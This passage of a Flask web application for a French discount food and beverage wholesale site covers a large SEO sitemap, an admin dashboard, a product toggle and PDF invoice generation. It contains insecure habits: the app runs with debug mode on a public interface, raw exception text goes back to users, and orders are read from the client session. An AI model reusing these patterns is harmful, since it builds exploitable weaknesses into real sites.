        '/palette-alimentaire-destockage', '/be/destockage-alimentaire-belgique',
        '/psg-champion-europe', '/loi-anti-gaspillage-2025', '/blog/espana-descuentos-alimentarios',
        '/blog/belgique-bon-marche-nourriture', '/blog/suisse-pas-cher-nourriture',
        '/landing.html', '/urgence.html', '/fr/destockage_espagne.html',
        '/liquidation-alimentaire-25mai2025', '/confirmation1','/produits-belgique','/article-canicule-destockage','/article-vague-chaleur-promotions','/destockage-belgique-espagne','/article-destockage-belgique','/espagne',
        '/destockage-alimentaire-urgence-23mai2025', '/pourquoi-destockage-alimentaire','/conflit-iran-israel-2025',
        '/track-conversion', '/destockage-urgence', '/promo-urgence',
        '/psg-champion-europe', '/meilleur-destockage-alimentaire', '/contact-urgence-25mai','/Destockage-Alimentaire-Grossiste','/destockage-urgence3',
        '/destockage-alimentario-espana', '/blog/psg-champion-europe-2025','/destockage-alimentaire-professionnel1',
        '/product-feed.xml', '/france-boissons', '/fournisseur-alcool', '/grossiste-alimentaire-en-ligne', '/bebidas-alcoholicas-guia', '/destockage-alimentaire-particulier', '/grossiste-boisson', '/destockage-boisson-belgique',
        '/article-grossiste-sitefrance','/article-grossiste-sitefrancelo','/article-espagne','/destockage-alimentaire-particuliers-français', '/descuentos-alimentarios-espana',
        '/destockage-alimentaire-particuliers-belge','/destockage-belgiquebbelge', '/trouver_magasins',
        '/supermarche_proximite',
        '/supermarche-ouvert-24-7',
        '/recettes-nutella',
        '/magasin-bio-local',
        '/grossiste-alimentaire-belgique',  # Ce nom est dupliqué (voir remarque plus bas)
        '/meilleurs-fournisseurs-aubervilliers-2025',
        '/distributeurs-automatiques-rentabilite-innovations',
        '/champagne-destockage',
        '/canette-coca-histoire-innovation',
        '/astuces_destockage',
        '/grossiste-boisson2025',
        '/grossiste-alimentaire2025',
        '/grossiste-alimentaire-belgique2025',
        '/mayorista-alimentos-espana',
        '/grossiste-alimentaire-france',
        '/grossista-alimentare-italia','/boissons-en-gros-pas-cheres',
        '/blog/anti-gaspi-creatif',
        '/grossiste-boissonbbelgique1',
        '/grossiste-boisson09',
        '/grossiste-alimstore',
        '/blog/champagne-brut',
        '/blog/champagne-pas-cher1',
        '/blog/prix-champagne-2023',
        '/blog/destockage-local',
        '/blog/champagne-bollinger-brut',
        '/blog/champagne-blanc-de-blancs',
        '/blog/economiser-alimentation',
        '/blog/destockage-date-courte',
        '/blog/prix-bouteilles-ruinart',
        '/blog/ruinart-blanc-de-blanc',
        '/blog/prix-dom-perignon',
        '/blog/dom-perignon-rose',
        '/blog/nutella',
        '/blog/discount-alimentaire',
        '/blog/champagne-pas-chere',
        '/blog/discount-belgique-alimentaire',
        '/grossisteboissonstore',
        "/discount-alimentaire-economies-astuces",
        "/discount-alimentaire-guide-ultime-2025",
        "/blog/innovations-2025-distribution-boissons-modernisee",
        "/destockage-date-courte-anti-gaspillage-2025",
        "/grossiste-alimentation-halal-choisir-fournisseur-25",
        "/groothandel-voor-horeca",
        "/grossistes-alimentaires-bruxelles-2025",
        '/grossisteboissonbelgiquestore',
        '/blog/soldes-alimentaires',
        '/blog/anti-gaspillage',
        '/blog/grossiste-halal',
        '/grossistes-alimentaires-paris-2023',
        '/astuces-economie-alimentation',
        '/avantages-grossiste-boisson',
        '/destockage-alimentaire-belgique-guide',
        '/avantages-destockage-local',
        '/tendances-distribution',
        '/achat-boisson-gros',
        '/destockage-alimentaire-paris',
        '/destockage-alimentaire-lille',
        '/initiatives-destockage-alimentaire',
        '/optimiser-magasin-distribution',
        '/blog/grossiste-electromenager',
        '/blog/innovations-distribution',
        '/blog/boissons-gros',
        '/blog/discount-alimentation',
        # Pages Blog
        '/blog/destockage-alimentaire-belgique',
        '/blog/achat-ruinart',
        '/blog/champagne-en-gros',
        '/blog/prix-champagne',
        '/blog/discount1-alimentation-astuces',
        '/blog/dom-perignon-prix',
        '/blog/dom-perignon-2012',
        '/blog/nutella-750g-recettes',
        '/blog/champagne-ruinart',
        '/blog/dom-perignon',
        '/blog/grossistes-boissons-2023',
        '/blog/dom-perignon-champagne-luxe',
        '/blog/champagne25-ruinart',
        '/blog/ruinart-brut-champagne',
        '/blog/distribution-alimentaire-belgique',
        '/blog/grossiste-alimentaire-belgique-2025',
        '/blog/grossiste-alimentaire-bruxelles',
        '/blog/magasins-alimentation-bio-traditionnel',
        '/blog/grossiste-bruxelles',
        '/blog/alcohol-barato',
        '/blog/top-grossistes-alimentaires-bruxelles',
        '/blog/champagne-pas-cher-rapport-qualite-prix',
        '/blog/destockage-alimentaire-belgique',
        '/blog/ruinart-achat-guide-complet',
        '/blog/prix-red-bull-meilleures-offres',
        '/blog/destockage-alimentaire-avantages-defis',
        '/blog/discount-alimentation-economisez-achats',
        '/blog/tendances-distribution-boissons',
        '/blog/recettes-nutella-faciles-delicieuses',
        '/blog/comment-choisir-produit-entretien-efficace',
        '/blog/luxe-champagne-marques-prestigieuses',
        '/blog/prix-nutella-tendances-astuces-economiser',
        '/blog/optimisation-magasin-distribution',
        '/blog/destockage-alimentaire-economiser-reduire-gaspillage',
        '/blog/mayorista-espana',
        '/blog/boissons-suisses',
        '/blog/tendances-horeca',
        '/blog/alimentation-bio',
        '/blog/discount-alimentation-maximisez-economies-soldes',
        '/blog/discount-alimentation-astuces-economiser',
        '/blog/optimiser-magasin-distribution',
        '/blog/champagne-solde-astuces-bonnes-affaires',
        '/blog/destockage-alimentaire-local-ecologie',
        '/blog/champagne-pas-cher-qualite-economie',
        '/blog/distribution-boisson-tendances-innovations-2025',
        '/blog/destockage-pres-chez-vous-offres',
        '/blog/boisson-en-gros-pas-cher-offres',
        '/blog/grossiste-alimentation-halal-guide-achat',
        '/blog/guide-champagne-3-litres-luxe',
        '/blog/hard-discount-ascension-impact',
        '/blog/magasin-alimentaire-bio-local-belgique',
        '/blog/trouver-fournisseur-ideal-revendeur-pro',
        '/blog/destockage-alimentaire-economies-durabilite-belgique',
        '/achat-destockage',
        '/destockage-alimentaire-lille',
        '/destockage-alimentaire-paris',
        '/blog/destockage-alimentaire-comment-economiser-reduire-gaspillage',
        '/blog/strategies-economie-alimentation-discount',
        '/blog/champagne-pas-cher-2025',
        '/blog/achat-ruinart',
        '/blog/destockage-alimentaire-belgique-25',
        '/blog/destockage-alimentaire-25-belgique',
        '/blog/destockage-alimentaire-paris',
        '/blog/destockage-alimentaire-lille'
        '/guide-grossistes-paris',
        '/grossiste-alimentaire-international',
        '/be/grossiste-alimentaire-international',
        '/ch/grossiste-alimentaire-international',
        '/es/mayorista-alimentario-internacional','/destockage-alimentaire-belgique-25','/discount-alimentaire-25','/destockage-alimentaire-bruxelles-25',
        '/guide-des-soldes-alimentaires',
        '/blog/produits-italiens','/comprar-alimentos-por-mayor-espana',
        '/alimentos_por_mayor', '/fr/destockage,destockage_nl.html','/en/surplus','/destockbelge','/destockagefranceparis','/beneficios-aceite-oliva'
    ]

    # Ajoutez les URLs des produits
    for product in products:
        product_id = product.get('id')
        product_name = product.get('name')
        if product_id and product_name:
            slug = slugify(product_name)
            pages.append(f"/produit/{product_id}-{slug}")

    # Ajoutez les URLs des catégories
    from data import categories
    for category in categories:
        slug = slugify(category)
        pages.append(f"/categorie/{slug}")

    sitemap_xml = render_template('sitemap.xml', pages=pages, now=datetime.utcnow())
    response = make_response(sitemap_xml)
    response.headers['Content-Type'] = 'application/xml'
    return response



@app.route('/robots.txt')
def robots():
    return send_from_directory(app.static_folder, 'robots.txt')
    
@app.before_request
def enforce_www():
    # Redirige uniquement si l'host commence par 'www.' et ce n'est pas déjà en 'destockalimentairestore.com'
    if request.host.startswith('www.destockalimentairestore.com'):
        url = request.url.replace('www.destockalimentairestore.com', 'destockalimentairestore.com', 1)
        return redirect(url, code=301)

@app.route('/admin/dashboard')
@admin_required
def admin_dashboard():
    # Récupérer toutes les commandes depuis la session
    orders_session = session.get('orders', {})

    # Préparer les commandes pour affichage
    processed_orders = []
    for order_id, order_data in orders_session.items():
        order_total = 0
        order_items = []
        for product_id, quantity in order_data.get('items', {}).items():
            product = next((p for p in products if str(p['id']) == str(product_id)), None)
            if product:
                item_total = product['price'] * int(quantity)
                order_total += item_total
                order_items.append({
                    'name': product['name'],
                    'quantity': quantity,
                    'price': product['price'],
                    'total': item_total
                })
        payment_info = {
            'method': order_data.get('payment_method', 'Non spécifié'),
            'status': order_data.get('status', 'Inconnu'),
            'total': order_total
        }
        processed_orders.append({
            'id': order_id,
            'date': order_data.get('date', 'Date inconnue'),
            'user': order_data.get('user', 'Invité'),
            'items': order_items,
            'payment': payment_info,
            'status': order_data.get('status', 'En traitement')
        })

    processed_orders.sort(key=lambda x: x.get('date', ''), reverse=True)

    # Récupérer tous les utilisateurs depuis la DB
    all_users = User.query.all()

    return render_template(
        'admin_dashboard.html',
        orders=processed_orders,
        users=all_users,
        products=products
    )


@app.route("/mentions-legales")
def mentions_legales():
    return render_template("mentions-legales.html")

@app.route("/cgv")
def cgv():
    return render_template("cgv.html")

@app.route("/politique-confidentialite")
def politique_confidentialite():
    return render_template("politique-confidentialite.html")

@app.route("/faq")
def faq():
    return render_template("faq.html")


# Route pour basculer un produit en vedette
@app.route('/admin/toggle-featured/<int:product_id>', methods=['POST'])
def toggle_featured(product_id):
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Non autorisé'}), 401
    
    product = next((p for p in products if p['id'] == product_id), None)
    if not product:
        return jsonify({'success': False, 'message': 'Produit non trouvé'}), 404
    
    try:
        product['featured'] = not product['featured']
        return jsonify({'success': True, 'featured': product['featured']})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


@app.route('/deconnexion')
def logout():
    session.clear()
    flash('Vous avez été déconnecté', 'success')
    return redirect(url_for('index'))

@app.route('/generate_proforma/<order_id>')
def generate_proforma(order_id):
    try:
        from reportlab.lib.pagesizes import landscape, letter
        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image
        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
        from reportlab.lib import colors
        from io import BytesIO
        import os
        from datetime import datetime, timedelta

        # Vérification de la commande
        if 'orders' not in session or order_id not in session['orders']:
            app.logger.error(f"Commande {order_id} introuvable")
            return "Commande introuvable", 404

        order = session['orders'][order_id]

        # Création du buffer PDF
        buffer = BytesIO()
        
        # Configuration du document
        doc = SimpleDocTemplate(buffer, pagesize=landscape(letter),
                              rightMargin=30,
                              leftMargin=30,
                              topMargin=30,
                              bottomMargin=30)

        styles = getSampleStyleSheet()
        
        # Styles personnalisés
        styles.add(ParagraphStyle(
            name='InvoiceTitle',
            fontSize=18,
            textColor=colors.HexColor('#2a5bd7'),
            alignment=1,
            spaceAfter=20
        ))

        elements = []

        # Logo (vérifier que le fichier existe dans static/images/logo.png)
        try:
            logo_path = os.path.join(app.static_folder, 'images', 'logo.png')
            if os.path.exists(logo_path):
                logo = Image(logo_path, width=180, height=80)
                elements.append(logo)
                elements.append(Spacer(1, 20))
        except Exception as e:
            app.logger.warning(f"Erreur logo: {str(e)}")

        # Titre
        elements.append(Paragraph("FACTURE PROFORMA", styles['InvoiceTitle']))
        elements.append(Spacer(1, 30))

        # Informations de base
        info = [
            ["N° Facture:", order_id],
            ["Date:", datetime.now().strftime('%d/%m/%Y %H:%M')],
            ["Client:", order.get('user', 'Guest')],
            ["Statut:", order.get('status', 'En traitement')]
        ]

        info_table = Table(info, colWidths=[100, 400])
        info_table.setStyle(TableStyle([
            ('FONTNAME', (0,0), (-1,-1), 'Helvetica'),
            ('FONTSIZE', (0,0), (-1,-1), 10),
            ('VALIGN', (0,0), (-1,-1), 'TOP'),
            ('ALIGN', (0,0), (0,-1), 'LEFT'),
            ('TEXTCOLOR', (0,0), (0,-1), colors.HexColor('#6b7280')),
        ]))
        
        elements.append(info_table)
        elements.append(Spacer(1, 30))

        # Détails des articles
        items_header = ["Produit", "Prix unitaire", "Quantité", "Total"]
        items_data = [items_header]
        
        subtotal = 0
        for product_id, quantity in order['items'].items():
            product = next((p for p in products if str(p['id']) == product_id), None)
            if product:
                item_total = product['price'] * int(quantity)
                subtotal += item_total
                items_data.append([
                    product['name'],
                    f"{product['price']:.2f}€",
                    str(quantity),
                    f"{item_total:.2f}€"
                ])

        tva = subtotal * 0.2
        total_ttc = subtotal + tva
        
        items_table = Table(items_data, colWidths=[300, 80, 80, 80])
        items_table.setStyle(TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor('#2a5bd7')),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('ALIGN', (0,0), (-1,-1), 'LEFT'),
            ('ALIGN', (2,0), (-1,-1), 'RIGHT'),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('FONTSIZE', (0,0), (-1,-1), 10),
            ('BOTTOMPADDING', (0,0), (-1,-1), 8),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor('#e5e7eb')),
        ]))
        
        elements.append(items_table)
        elements.append(Spacer(1, 20))

        # Totaux
        totals = [
            ["", "", "Sous-total:", f"{subtotal:.2f}€"],
            ["", "", "TVA (20%):", f"{tva:.2f}€"],
            ["", "", "Total TTC:", f"<b>{total_ttc:.2f}€</b>"]
        ]
        
        totals_table = Table(totals, colWidths=[300, 80, 80, 80])
        totals_table.setStyle(TableStyle([
            ('ALIGN', (2,0), (-1,-1), 'RIGHT'),
            ('FONTNAME', (0,-1), (-1,-1), 'Helvetica-Bold'),
            ('LINEABOVE', (0,0), (-1,0), 1, colors.HexColor('#6b7280')),
        ]))
        
        elements.append(totals_table)
        elements.append(Spacer(1, 30))

        # Pied de page
        footer = Paragraph(
            "Destockage Professionnel - SAS au capital de 50 000€<br/>"
            "123 Rue du Commerce, 75000 Paris - contact@destockage-pro.com",
            ParagraphStyle(
                name='Footer',
                fontSize=8,
                textColor=colors.HexColor('#6b7280'),
                alignment=1
            )
        )
        elements.append(footer)

        # Génération du PDF
        doc.build(elements)
        
        # Préparation de la réponse
        buffer.seek(0)
        response = make_response(buffer.getvalue())
        response.headers['Content-Type'] = 'application/pdf'
        response.headers['Content-Disposition'] = f'inline; filename=Facture_{order_id}.pdf'
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        
        return response

    except Exception as e:
        app.logger.error(f"Erreur génération PDF: {str(e)}")
        return f"Erreur lors de la génération du PDF: {str(e)}", 500
    
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
@app.route('/test_pdf')
def test_pdf():
    buffer = BytesIO()
    p = canvas.Canvas(buffer)
    p.drawString(100, 100, "Test PDF - Ça fonctionne !")
    p.showPage()
    p.save()
    buffer.seek(0)
    return send_file(buffer, mimetype='application/pdf')


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5010))  # Render fournit le port via la variable PORT
    app.run(host='0.0.0.0', port=port, debug=True)
